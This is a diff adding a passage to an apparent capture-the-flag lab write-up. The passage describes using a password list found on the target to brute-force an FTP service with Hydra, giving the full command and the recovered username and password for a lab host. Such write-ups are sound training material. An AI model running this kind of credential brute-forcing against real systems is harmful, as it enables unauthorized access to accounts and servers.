@@ -627,3 +627,14 @@ Using binary mode to transfer files.
 I continued enumerating the server and discovered a directory named simon, which contained a text file called mynotes.txt. Upon inspecting its contents, I noticed that it appeared to contain passwords for something, though its exact purpose was unclear at this stage.
 
 [![Screenshot-2025-02-28-102902.png](https://i.postimg.cc/m2fFqrFL/Screenshot-2025-02-28-102902.png)](https://postimg.cc/bdgJSpTW)
+
+Next, I attempted a brute-force attack against the FTP server running on port 2121 using Hydra. I executed the following command:
+
+```bash
+hydra -l simon -P mynotes.txt -t 64 ftp://10.129.201.127 -s 2121
+```
+
+This attack successfully yielded one valid set of credentials:
+
+-Username: simon
+-Password: 8Ns8j1b!23hs4921smHzwn
